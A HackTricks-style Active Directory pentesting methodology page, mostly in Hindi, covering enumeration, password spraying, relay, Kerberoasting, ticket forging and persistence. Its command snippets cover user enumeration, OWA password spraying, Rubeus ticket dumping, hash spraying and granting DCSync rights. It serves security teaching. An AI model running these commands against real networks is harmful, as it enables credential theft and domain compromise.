# Active Directory कार्यप्रणाली

{{#include ../../banners/hacktricks-training.md}}

## बुनियादी अवलोकन

**Active Directory** एक मौलिक तकनीक के रूप में कार्य करता है, जो **नेटवर्क प्रशासकों** को नेटवर्क के भीतर **डोमेन**, **यूज़र्स**, और **ऑब्जेक्ट्स** को कुशलता से बनाने और प्रबंधित करने में सक्षम बनाता है। यह बड़े पैमाने पर स्केल करने के लिए डिज़ाइन किया गया है, जिससे बड़ी संख्या में उपयोगकर्ताओं को प्रबंधनीय **ग्रुप्स** और **सबग्रुप्स** में व्यवस्थित किया जा सके, और विभिन्न स्तरों पर **access rights** नियंत्रित किए जा सकें।

**Active Directory** की संरचना तीन मुख्य परतों से मिलकर बनी होती है: **डोमेन्स**, **ट्रीज़**, और **फॉरेस्ट्स**। एक **डोमेन** उन ऑब्जेक्ट्स का समूह होता है, जैसे **यूज़र्स** या **डिवाइस**, जो एक साझा डेटाबेस साझा करते हैं। **Trees** इन डोमेन्स के समूह होते हैं जो एक साझा स्ट्रक्चर से जुड़े होते हैं, और एक **forest** कई trees का संग्रह होता है, जो **trust relationships** के माध्यम से परस्पर जुड़े होते हैं, और संगठनात्मक संरचना की शीर्ष परत बनाते हैं। प्रत्येक स्तर पर विशिष्ट **access** और **communication rights** निर्दिष्ट किए जा सकते हैं।

Active Directory के प्रमुख सिद्धांतों में शामिल हैं:

1. **Directory** – Active Directory ऑब्जेक्ट्स से संबंधित सभी जानकारी रखता है।
2. **Object** – डायरेक्टरी के भीतर मौजूद संस्थाओं को दर्शाता है, जिसमें **यूज़र्स**, **ग्रुप्स**, या **shared folders** शामिल हैं।
3. **Domain** – डायरेक्टरी ऑब्जेक्ट्स का एक कंटेनर होता है; एक **forest** के भीतर कई डोमेन्स सह-अस्तित्व में हो सकते हैं, प्रत्येक का अपना ऑब्जेक्ट संग्रह होता है।
4. **Tree** – डोमेन्स का एक समूह जो एक सामान्य root domain साझा करता है।
5. **Forest** – Active Directory में संगठनात्मक संरचना की शीर्ष परत, जो कई trees से बनी होती है और उनके बीच **trust relationships** होती हैं।

**Active Directory Domain Services (AD DS)** कई ऐसे सर्विसेज़ को समाहित करता है जो नेटवर्क के केंद्रीकृत प्रबंधन और संचार के लिए महत्वपूर्ण हैं। इन सर्विसेज़ में शामिल हैं:

1. **Domain Services** – डेटा स्टोरेज को केंद्रीकृत करता है और **यूज़र्स** और **डोमेन्स** के बीच इंटरैक्शन (जैसे **authentication** और **search** फंक्शनलिटी) को मैनेज करता है।
2. **Certificate Services** – सुरक्षित **digital certificates** के निर्माण, वितरण, और प्रबंधन की निगरानी करता है।
3. **Lightweight Directory Services** – **LDAP protocol** के माध्यम से डायरेक्टरी-एनेबल्ड एप्लिकेशंस का समर्थन करता है।
4. **Directory Federation Services** – उपयोगकर्ताओं को एकल सत्र में कई वेब एप्लिकेशंस के लिए प्रमाणीकृत करने के लिए **single-sign-on** क्षमताएँ प्रदान करता है।
5. **Rights Management** – कॉपीराइट सामग्री की अनधिकृत वितरण और उपयोग को नियंत्रित करके उसकी सुरक्षा में मदद करता है।
6. **DNS Service** – **domain names** के रिज़ॉल्यूशन के लिए आवश्यक है।

उपयुक्त विस्तार के लिए देखें: [**TechTerms - Active Directory Definition**](https://techterms.com/definition/active_directory)

### **Kerberos Authentication**

To learn how to **attack an AD** you need to **understand** really good the **Kerberos authentication process**.\
[**Read this page if you still don't know how it works.**](kerberos-authentication.md)

## Cheat Sheet

You can take a lot to [https://wadcoms.github.io/](https://wadcoms.github.io) to have a quick view of which commands you can run to enumerate/exploit an AD.

> [!WARNING]
> Kerberos communication **requires a full qualifid name (FQDN)** for performing actions. If you try to access a machine by the IP address, **it'll use NTLM and not kerberos**.

## Recon Active Directory (No creds/sessions)

यदि आपके पास केवल AD पर्यावरण तक पहुंच है पर कोई credentials/sessions नहीं हैं तो आप कर सकते हैं:

- **Pentest the network:**
- नेटवर्क स्कैन करें, मशीनें और खुले पोर्ट्स खोजें और **exploit vulnerabilities** करने या उनसे **extract credentials** करने का प्रयास करें (उदाहरण के लिए, [printers could be very interesting targets](ad-information-in-printers.md) ).
- DNS का एन्यूमरेशन डोमेन में प्रमुख सर्वरों (जैसे वेब, प्रिंटर, shares, vpn, media आदि) के बारे में जानकारी दे सकता है।
- `gobuster dns -d domain.local -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt`
- अधिक जानकारी के लिए General [**Pentesting Methodology**](../../generic-methodologies-and-resources/pentesting-methodology.md) देखें।
- **Check for null and Guest access on smb services** (यह आधुनिक Windows वर्ज़न पर काम नहीं करेगा):
- `enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>`
- `smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>`
- `smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //`
- SMB सर्वर का एन्यूमरेशन करने के लिए एक अधिक विस्तृत गाइड यहाँ मिल सकता है:


{{#ref}}
../../network-services-pentesting/pentesting-smb/
{{#endref}}

- **Enumerate Ldap**
- `nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>`
- LDAP का एन्यूमरेशन कैसे करें इस पर एक विस्तृत गाइड यहाँ मिलती है (विशेषकर **anonymous access** पर ध्यान दें):


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

- **Poison the network**
- Responder का उपयोग करके [**impersonating services with Responder**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md) से credentials इकट्ठा करें
- [**abusing the relay attack**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) द्वारा होस्ट तक पहुंचें
- **fake UPnP services with evil-S** का उपयोग करके credentials **exposing** करें [**SDP**](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856)
- [**OSINT**](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/external-recon-methodology/index.html):
- आंतरिक दस्तावेजों, सोशल मीडिया, डोमेन वातावरण के अंदर सेवाओं (मुख्य रूप से वेब) और सार्वजनिक रूप से उपलब्ध स्रोतों से usernames/नाम निकालें।
- अगर आपको कंपनी के कर्मचारियों के पूर्ण नाम मिलते हैं, तो आप विभिन्न AD **username conventions** आजमा सकते हैं ([**read this**](https://activedirectorypro.com/active-directory-user-naming-convention/)). सबसे सामान्य कन्वेंशन्स हैं: _NameSurname_, _Name.Surname_, _NamSur_ (प्रत्येक का 3 अक्षर), _Nam.Sur_, _NSurname_, _N.Surname_, _SurnameName_, _Surname.Name_, _SurnameN_, _Surname.N_, 3 _random letters and 3 random numbers_ (abc123).
- टूल्स:
- [w0Tx/generate-ad-username](https://github.com/w0Tx/generate-ad-username)
- [urbanadventurer/username-anarchy](https://github.com/urbanadventurer/username-anarchy)

### User enumeration

- **Anonymous SMB/LDAP enum:** [**pentesting SMB**](../../network-services-pentesting/pentesting-smb/index.html) और [**pentesting LDAP**](../../network-services-pentesting/pentesting-ldap.md) पेज देखें।
- **Kerbrute enum**: जब कोई **invalid username is requested** होता है तो सर्वर **Kerberos error** कोड _KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN_ के साथ जवाब देगा, जिससे हम यह निर्धारित कर सकते हैं कि यूजरनेम अमान्य था। **Valid usernames** या तो **TGT in a AS-REP** प्रतिक्रिया में देंगे या त्रुटि _KRB5KDC_ERR_PREAUTH_REQUIRED_ देंगे, जो संकेत देता है कि यूज़र को pre-authentication करना आवश्यक है।
- **No Authentication against MS-NRPC**: domain controllers पर MS-NRPC (Netlogon) इंटरफ़ेस के खिलाफ auth-level = 1 (No authentication) का उपयोग करके। यह मेथड MS-NRPC इंटरफ़ेस को बाइंड करने के बाद `DsrGetDcNameEx2` फ़ंक्शन को कॉल करता है ताकि बिना किसी क्रेडेंशियल के यह जांचा जा सके कि यूज़र या कंप्यूटर मौजूद है या नहीं। यह प्रकार का एन्यूमरेशन NauthNRPC टूल द्वारा इम्प्लीमेंट किया गया है। रिसर्च यहाँ मिलती है [here](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)
```bash
./kerbrute_linux_amd64 userenum -d lab.ropnop.com --dc 10.10.10.10 usernames.txt #From https://github.com/ropnop/kerbrute/releases

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" <IP>
Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/Desktop/usernames.txt <IP>

msf> use auxiliary/gather/kerberos_enumusers

crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq
python3 nauth.py -t target -u users_file.txt #From https://github.com/sud0Ru/NauthNRPC
```
- **OWA (Outlook Web Access) Server**

यदि आप नेटवर्क में ऐसे किसी सर्वर को पाते हैं, तो आप **user enumeration against it** भी कर सकते हैं। उदाहरण के लिए, आप टूल [**MailSniper**](https://github.com/dafthack/MailSniper) का उपयोग कर सकते हैं:
```bash
ipmo C:\Tools\MailSniper\MailSniper.ps1
# Get info about the domain
Invoke-DomainHarvestOWA -ExchHostname [ip]
# Enumerate valid users from a list of potential usernames
Invoke-UsernameHarvestOWA -ExchHostname [ip] -Domain [domain] -UserList .\possible-usernames.txt -OutFile valid.txt
# Password spraying
Invoke-PasswordSprayOWA -ExchHostname [ip] -UserList .\valid.txt -Password Summer2021
# Get addresses list from the compromised mail
Get-GlobalAddressList -ExchHostname [ip] -UserName [domain]\[username] -Password Summer2021 -OutFile gal.txt
```
> [!WARNING]
> आप usernames की सूची [**this github repo**](https://github.com/danielmiessler/SecLists/tree/master/Usernames/Names) और इस वाले रिपो में पा सकते हैं ([**statistically-likely-usernames**](https://github.com/insidetrust/statistically-likely-usernames)).
> 
> हालांकि, आपको recon स्टेप में कंपनी में काम करने वाले लोगों के नाम पहले से ही मिलने चाहिए। नाम और surname के साथ आप स्क्रिप्ट [**namemash.py**](https://gist.github.com/superkojiman/11076951) का उपयोग संभावित वैध usernames जेनरेट करने के लिए कर सकते हैं।

### Knowing one or several usernames

ठीक है, तो आपके पास पहले से एक वैध username है पर password नहीं... तो कोशिश करें:

- [**ASREPRoast**](asreproast.md): अगर किसी user के पास attribute _DONT_REQ_PREAUTH_ **नहीं है** तो आप उस user के लिए **AS_REP message** request कर सकते हैं, जिसमें user के password की डेरिवेशन से एन्क्रिप्टेड कुछ डेटा होगा।
- [**Password Spraying**](password-spraying.md): खोजे गए प्रत्येक user के साथ सबसे सामान्य passwords ट्राई करें — शायद किसी user ने कमजोर password इस्तेमाल किया हो (password policy का ध्यान रखें!)।
- ध्यान दें कि आप users के mail servers तक पहुँचने के लिए **OWA servers** पर भी spray कर सकते हैं।


{{#ref}}
password-spraying.md
{{#endref}}

### LLMNR/NBT-NS Poisoning

आप शायद कुछ challenge **hashes** प्राप्त कर सकें जो नेटवर्क के कुछ प्रोटोकॉल्स की **poisoning** करके crack की जा सकें:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

### NTLM Relay

अगर आप Active Directory को enumerate करने में सफल रहे हैं तो आपके पास और भी ईमेलस और नेटवर्क की बेहतर समझ होगी। आप NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) को फोर्स करके AD env तक पहुँचने में सक्षम हो सकते हैं।

### Steal NTLM Creds

अगर आप **null या guest user** के साथ अन्य PCs या shares तक access कर पाते हैं तो आप ऐसी फाइलें (जैसे एक SCF file) रख सकते हैं जो अगर किसी ने access कीं तो यह आपकी तरफ NTLM authentication trigger कर देंगी — इससे आप NTLM challenge चुरा कर उसे crack कर सकते हैं:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

## Active Directory का एन्यूमरेशन WITH credentials/session

इस चरण के लिए आपको किसी वैध domain account के credentials या session को compromise करना होगा। अगर आपके पास कुछ वैध credentials या domain user के रूप में shell है, तो याद रखें कि पहले बताई गई ऑप्शन्स अभी भी अन्य users को compromise करने के लिए विकल्प हैं।

authenticated enumeration शुरू करने से पहले आपको **Kerberos double hop problem** पता होना चाहिए।


{{#ref}}
kerberos-double-hop-problem.md
{{#endref}}

### Enumeration

किसी account को compromise करना पूरे domain को compromise करने की शुरुआत के लिए एक बड़ा कदम है, क्योंकि अब आप Active Directory Enumeration शुरू कर पाएंगे:

[**ASREPRoast**](asreproast.md) के बारे में — अब आप प्रत्येक संभावित vulnerable user को ढूंढ सकते हैं, और [**Password Spraying**](password-spraying.md) के संदर्भ में आप सभी usernames की सूची लेकर compromised account का password, empty passwords और नए promising passwords ट्राई कर सकते हैं।

- आप बेसिक recon करने के लिए [**CMD to perform a basic recon**](../basic-cmd-for-pentesters.md#domain-info) का उपयोग कर सकते हैं
- आप [**powershell for recon**](../basic-powershell-for-pentesters/index.html) का भी उपयोग कर सकते हैं जो ज्यादा stealthy होगा
- आप और ज्यादा डिटेल्ड जानकारी निकालने के लिए [**powerview**](../basic-powershell-for-pentesters/powerview.md) भी उपयोग कर सकते हैं
- Active Directory में recon के लिए एक और शानदार टूल [**BloodHound**](bloodhound.md) है। यह **बहुत stealthy नहीं** है (depending on collection methods), लेकिन अगर आप stealth की परवाह नहीं करते तो इसे जरूर ट्राय करें। देखें कि कहाँ users RDP कर सकते हैं, अन्य groups तक path क्या हैं, इत्यादि।
- **अन्य automated AD enumeration tools हैं:** [**AD Explorer**](bloodhound.md#ad-explorer)**,** [**ADRecon**](bloodhound.md#adrecon)**,** [**Group3r**](bloodhound.md#group3r)**,** [**PingCastle**](bloodhound.md#pingcastle)**.**
- [**DNS records of the AD**](ad-dns-records.md) — ये उपयोगी जानकारी रख सकते हैं।
- एक **GUI वाला टूल** जो आप AD enumerate करने के लिए उपयोग कर सकते हैं वह है **AdExplorer.exe** from **SysInternal** Suite।
- आप LDAP database में **ldapsearch** से भी खोज कर सकते हैं ताकि fields _userPassword_ & _unixUserPassword_ में credentials देखें, या _Description_ में। अन्य तरीकों के लिए cf. [Password in AD User comment on PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#password-in-ad-user-comment)।
- अगर आप **Linux** उपयोग कर रहे हैं, तो आप domain enumerate करने के लिए [**pywerview**](https://github.com/the-useless-one/pywerview) भी उपयोग कर सकते हैं।
- आप automated tools भी ट्राई कर सकते हैं:
- [**tomcarver16/ADSearch**](https://github.com/tomcarver16/ADSearch)
- [**61106960/adPEAS**](https://github.com/61106960/adPEAS)
- **सभी domain users निकालना**

Windows में सभी domain usernames प्राप्त करना बहुत आसान है (`net user /domain` ,`Get-DomainUser` या `wmic useraccount get name,sid`)। Linux में आप उपयोग कर सकते हैं: `GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username` या `enum4linux -a -u "user" -p "password" <DC IP>`

> भले ही यह Enumeration सेक्शन छोटा लग रहा हो, यह सबसे महत्वपूर्ण भाग है। दिए गए links (मुख्यतः cmd, powershell, powerview और BloodHound वाले) खोलें, सीखें कि domain को कैसे enumerate करना है और अभ्यास करें जब तक आप आरामदायक न हो जाएं। एक assessment के दौरान, यही वह मुख्य क्षण होगा जब आप DA तक पहुँचने का रास्ता खोजेंगे या तय करेंगे कि कुछ भी नहीं किया जा सकता।

### Kerberoast

Kerberoasting में services से जुड़े user accounts द्वारा उपयोग किए जाने वाले **TGS tickets** प्राप्त करना और उनके एन्क्रिप्शन (जो user passwords पर आधारित है) को offline crack करना शामिल है।

और अधिक जानकारी:


{{#ref}}
kerberoast.md
{{#endref}}

### Remote connexion (RDP, SSH, FTP, Win-RM, etc)

एक बार जब आपको कुछ credentials मिल जाएँ तो आप जांच सकते हैं कि क्या किसी भी machine तक आपकी पहुँच है। इसके लिए आप कई सर्वरों पर अलग-अलग protocols के साथ कनेक्ट करने के लिए **CrackMapExec** का उपयोग कर सकते हैं, अपनी ports scans के अनुसार।

### Local Privilege Escalation

यदि आपने एक सामान्य domain user के रूप में credentials या session compromise किया है और उस user से domain की किसी भी machine तक **access** है तो आपको लोकल प्रिविलेज escalate करने और credentials loot करने की कोशिश करनी चाहिए। क्योंकि केवल local administrator privileges के साथ आप अन्य users के hashes memory (LSASS) और लोकली (SAM) से dump कर पाएंगे।

इस पुस्तक में [**local privilege escalation in Windows**](../windows-local-privilege-escalation/index.html) और एक [**checklist**](../checklist-windows-privilege-escalation.md) का पूरा पन्ना है। साथ ही, [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) का उपयोग करना न भूलें।

### Current Session Tickets

यह बहुत ही **असंभावित** है कि आप वर्तमान user में ऐसे **tickets** पाएँ जो आपको अनपेक्षित resources तक पहुँचने की अनुमति दें, लेकिन आप इनकी जाँच कर सकते हैं:
```bash
## List all tickets (if not admin, only current user tickets)
.\Rubeus.exe triage
## Dump the interesting one by luid
.\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))
```
### NTLM Relay

यदि आपने Active Directory को enumerate करने में सफलता प्राप्त की है तो आपके पास **अधिक ईमेल और नेटवर्क की बेहतर समझ** होगी। आप NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)** को मजबूर कर सकते हैं।**

### Looks for Creds in Computer Shares | SMB Shares

अब जब आपके पास कुछ बुनियादी credentials हैं तो आपको यह जांचना चाहिए कि क्या आप AD के अंदर साझा की जा रही किसी भी **interesting files being shared inside the AD** को **find** कर सकते हैं। आप यह मैन्युअली कर सकते हैं लेकिन यह बहुत उबाऊ और पुनरावृत्ति वाला काम है (और और भी अधिक अगर आप सैकड़ों docs पाते हैं जिन्हें आपको चेक करना होगा)।

[**Follow this link to learn about tools you could use.**](../../network-services-pentesting/pentesting-smb/index.html#domain-shared-folders-search)

### Steal NTLM Creds

यदि आप **access other PCs or shares** कर सकते हैं तो आप **place files** (जैसे SCF file) रख सकते हैं जो यदि किसी तरह access की जाएँ तो t**rigger an NTLM authentication against you** ताकि आप **steal** the **NTLM challenge** को crack कर सकें:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### CVE-2021-1675/CVE-2021-34527 PrintNightmare

यह vulnerability किसी भी authenticated user को **compromise the domain controller** करने की अनुमति देती थी।


{{#ref}}
printnightmare.md
{{#endref}}

## Privilege escalation on Active Directory WITH privileged credentials/session

**For the following techniques a regular domain user is not enough, you need some special privileges/credentials to perform these attacks.**

### Hash extraction

उम्मीद है आपने [AsRepRoast](asreproast.md), [Password Spraying](password-spraying.md), [Kerberoast](kerberoast.md), [Responder](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md) including relaying, [EvilSSDP](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md), [escalating privileges locally](../windows-local-privilege-escalation/index.html) का उपयोग करके **किसी local admin को compromise** कर लिया होगा।\
फिर, अब समय है कि आप memory और लोकल रूप से सभी hashes को dump करें।\
[**Read this page about different ways to obtain the hashes.**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Pass the Hash

**एक बार जब आपके पास किसी user का hash हो जाता है**, आप इसका उपयोग करके उसे **impersonate** कर सकते हैं।\
आपको कुछ ऐसे **tool** का उपयोग करना होगा जो उस **hash** का उपयोग करके **NTLM authentication using** that **hash** को **perform** करे, **or** आप एक नया **sessionlogon** बना सकते हैं और उस **hash** को **LSASS** के अंदर **inject** कर सकते हैं, ताकि जब कोई भी **NTLM authentication is performed**, तो वह **hash** उपयोग किया जाएगा। आखिरी विकल्प वही है जो mimikatz करता है।\
[**Read this page for more information.**](../ntlm/index.html#pass-the-hash)

### Over Pass the Hash/Pass the Key

यह attack उपयोगकर्ता के NTLM hash का उपयोग करके Kerberos tickets प्राप्त करने का लक्ष्य रखता है, जो कि आम Pass The Hash के NTLM प्रोटोकॉल के विकल्प के रूप में है। इसलिए यह उन नेटवर्कों में विशेष रूप से उपयोगी हो सकता है जहाँ NTLM protocol disabled है और केवल Kerberos ही authentication protocol के रूप में allowed है।


{{#ref}}
over-pass-the-hash-pass-the-key.md
{{#endref}}

### Pass the Ticket

Pass The Ticket (PTT) attack method में, attackers उपयोगकर्ता का password या hash values चुराने के बजाय उपयोगकर्ता का authentication ticket चुरा लेते हैं। यह चोरी किया गया ticket तब उपयोगकर्ता का **impersonate** करने के लिए इस्तेमाल किया जाता है, जिससे नेटवर्क के भीतर संसाधनों और सेवाओं तक अनधिकृत पहुँच मिलती है।


{{#ref}}
pass-the-ticket.md
{{#endref}}

### Credentials Reuse

यदि आपके पास किसी **local administrato**r का **hash** या **password** है तो आपको इसे लेकर अन्य **PCs** पर **login locally** करने की कोशिश करनी चाहिए।
```bash
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
> [!WARNING]
> ध्यान दें कि यह काफी **शोर** कर सकता है और **LAPS** इसे **कम कर देगा**।

### MSSQL Abuse & Trusted Links

यदि किसी उपयोगकर्ता के पास **MSSQL instances** तक पहुँचने के अधिकार हैं, तो वह इसे MSSQL होस्ट पर **commands execute** करने के लिए उपयोग कर सकता है (यदि यह SA के रूप में चल रहा हो), NetNTLM **hash** चुरा सकता है या यहाँ तक कि एक **relay attack** भी कर सकता है।\
इसके अलावा, अगर एक MSSQL instance को किसी दूसरे MSSQL instance द्वारा trusted (database link) किया गया है और उपयोगकर्ता के पास trusted database पर अधिकार हैं, तो वह **trust relationship का उपयोग करके अन्य instance में भी queries execute** कर पाएगा। ये trusts chained हो सकते हैं और किसी बिंदु पर उपयोगकर्ता किसी misconfigured database को ढूँढ सकता है जहाँ वह commands चलाने में सक्षम हो।\
**डेटाबेस के बीच के लिंक फ़ॉरेस्ट ट्रस्ट्स के पार भी काम करते हैं।**


{{#ref}}
abusing-ad-mssql.md
{{#endref}}

### IT asset/deployment platforms abuse

Third-party inventory और deployment suites अक्सर credentials और code execution तक पहुँचने के शक्तिशाली रास्ते खोलते हैं। देखें:

{{#ref}}
sccm-management-point-relay-sql-policy-secrets.md
{{#endref}}

{{#ref}}
lansweeper-security.md
{{#endref}}

### Unconstrained Delegation

यदि आप किसी Computer object में attribute [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) पाते हैं और उस कंप्यूटर पर आपके पास domain privileges हैं, तो आप कंप्यूटर पर लॉगिन करने वाले हर उपयोगकर्ता की memory से TGTs dump कर सकेंगे।\
इसलिए, यदि कोई **Domain Admin उस कंप्यूटर पर लॉगिन** करता है, तो आप उसका TGT dump कर उसके रूप में [Pass the Ticket](pass-the-ticket.md) का उपयोग करके impersonate कर सकेंगे।\
constrained delegation के कारण आप यहाँ तक कि **एक Print Server को स्वचालित रूप से compromise** भी कर सकते हैं (आशा है वह DC नहीं होगा)।

{{#ref}}
unconstrained-delegation.md
{{#endref}}

### Constrained Delegation

यदि किसी user या computer को "Constrained Delegation" की अनुमति है तो वह **किसी कंप्यूटर में कुछ services तक पहुँचने के लिए किसी भी user का impersonate** करने में सक्षम होगा।\
फिर, यदि आप उस user/computer का **hash compromise** कर लेते हैं तो आप **किसी भी user** (यहां तक कि domain admins भी) का impersonate करके कुछ services तक पहुँच सकेंगे।

{{#ref}}
constrained-delegation.md
{{#endref}}

### Resourced-based Constrain Delegation

Active Directory के किसी remote computer के object पर **WRITE** privilege होने से **elevated privileges** के साथ code execution प्राप्त करना संभव हो जाता है:

{{#ref}}
resource-based-constrained-delegation.md
{{#endref}}

### Permissions/ACLs Abuse

Compromised user के पास कुछ domain objects पर **दिलचस्प privileges** हो सकते हैं जो आपको बाद में lateral movement/privilege **escalation** करने में मदद दें।

{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Printer Spooler service abuse

Domain के भीतर यदि किसी स्थान पर **Spool service listening** मिलता है तो इसे **नए credentials प्राप्त करने** और **privileges escalate** करने के लिए **abuse** किया जा सकता है।

{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### Third party sessions abuse

यदि **अन्य उपयोगकर्ता** compromised machine को **access** करते हैं, तो memory से उनके credentials **gather** करना और यहाँ तक कि उनके processes में **beacons inject** करके उनका impersonation करना संभव है।\
आमतौर पर उपयोगकर्ता RDP के माध्यम से system तक पहुँचते हैं, इसलिए यहाँ third party RDP sessions पर कुछ attacks करने के तरीके दिए गए हैं:

{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### LAPS

**LAPS** डोमेन-joined कंप्यूटरों पर local Administrator password को manage करने का एक सिस्टम प्रदान करता है, जो सुनिश्चित करता है कि ये पासवर्ड **randomized**, unique और बार-बार **changed** हों। ये पासवर्ड Active Directory में store होते हैं और ACLs के माध्यम से केवल authorised users के लिए access नियंत्रित होता है। यदि आपके पास इन पासवर्ड्स को access करने की पर्याप्त permissions हैं, तो अन्य कंप्यूटर्स की ओर pivot करना संभव हो जाता है।

{{#ref}}
laps.md
{{#endref}}

### Certificate Theft

Compromised मशीन से **certificates gather** करना environment के अंदर privileges escalate करने का एक तरीका हो सकता है:

{{#ref}}
ad-certificates/certificate-theft.md
{{#endref}}

### Certificate Templates Abuse

यदि **vulnerable templates** configured हैं तो उनका abuse करके privileges escalate करना संभव है:

{{#ref}}
ad-certificates/domain-escalation.md
{{#endref}}

## Post-exploitation with high privilege account

### Dumping Domain Credentials

एक बार जब आप **Domain Admin** या बेहतर **Enterprise Admin** privileges हासिल कर लेते हैं, तो आप **domain database**: _ntds.dit_ को **dump** कर सकते हैं।

[**More information about DCSync attack can be found here**](dcsync.md).

[**More information about how to steal the NTDS.dit can be found here**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Privesc as Persistence

पहले चर्चा की गई कुछ techniques को persistence के लिए उपयोग किया जा सकता है।\
उदाहरण के लिए आप कर सकते हैं:

- Make users vulnerable to [**Kerberoast**](kerberoast.md)

```bash
Set-DomainObject -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}r
```

- Make users vulnerable to [**ASREPRoast**](asreproast.md)

```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```

- Grant [**DCSync**](#dcsync) privileges to a user

```bash
Add-DomainObjectAcl -TargetIdentity "DC=SUB,DC=DOMAIN,DC=LOCAL" -PrincipalIdentity bfarmer -Rights DCSync
```

### Silver Ticket

**Silver Ticket attack** एक specific service के लिए एक वैध Ticket Granting Service (TGS) ticket बनाता है, जो आमतौर पर **NTLM hash** (उदा., PC account का hash) का उपयोग करके तैयार किया जाता है। यह तरीका service privileges तक पहुँचने के लिए उपयोग किया जाता है।

{{#ref}}
silver-ticket.md
{{#endref}}

### Golden Ticket

**Golden Ticket attack** में attacker Active Directory में krbtgt account का **NTLM hash** हासिल कर लेता है। यह account विशेष है क्योंकि यह सभी Ticket Granting Tickets (TGTs) को sign करने के लिए प्रयोग होता है, जो AD नेटवर्क में authentication के लिए आवश्यक होते हैं।

एक बार attacker इस hash को प्राप्त कर लेता है, तो वह किसी भी account के लिए **TGTs** बना सकता है (Silver ticket attack की तरह)।

{{#ref}}
golden-ticket.md
{{#endref}}

### Diamond Ticket

ये Golden Tickets की तरह होते हैं पर इन्हें इस प्रकार forge किया जाता है कि ये सामान्य golden ticket detection mechanisms को **bypass** कर दें।

{{#ref}}
diamond-ticket.md
{{#endref}}

### **Certificates Account Persistence**

किसी account के **certificates होने** या उन्हें request कर पाने की क्षमता किसी user account में persist करने का बहुत अच्छा तरीका है (यहाँ तक कि user password बदलने पर भी):

{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

### **Certificates Domain Persistence**

**Certificates** का उपयोग करके domain के अंदर उच्च privileges के साथ भी persist किया जा सकता है:

{{#ref}}
ad-certificates/domain-persistence.md
{{#endref}}

### AdminSDHolder Group

Active Directory में **AdminSDHolder** object privileged groups (जैसे Domain Admins और Enterprise Admins) की security सुनिश्चित करने के लिए एक standard **Access Control List (ACL)** apply करता है ताकि unauthorized changes रोके जा सकें। हालाँकि, इस feature का भी गलत उपयोग हो सकता है; यदि attacker AdminSDHolder की ACL को modify कर किसी सामान्य user को full access दे दे, तो वह user सभी privileged groups पर व्यापक नियंत्रण प्राप्त कर लेता है। यह सुरक्षा उपाय, जिसे unauthorized changes से बचाने के लिए बनाया गया था, अगर ठीक से monitored न हो तो उल्टा प्रभाव डाल सकता है।

[**More information about AdminDSHolder Group here.**](privileged-groups-and-token-privileges.md#adminsdholder-group)

### DSRM Credentials

हर **Domain Controller (DC)** के अंदर एक local administrator account मौजूद होता है। ऐसे किसी मशीन पर admin rights प्राप्त करके, local Administrator का hash **mimikatz** का उपयोग करके extract किया जा सकता है। उसके बाद registry में कुछ बदलाव करने की आवश्यकता होती है ताकि इस password का उपयोग संभव हो सके, जिससे local Administrator account तक remote access मिल सके।

{{#ref}}
dsrm-credentials.md
{{#endref}}

### ACL Persistence

आप किसी user को कुछ specific domain objects पर **विशेष permissions** दे सकते हैं जो उस user को भविष्य में privileges escalate करने में मदद करेंगी।

{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Security Descriptors

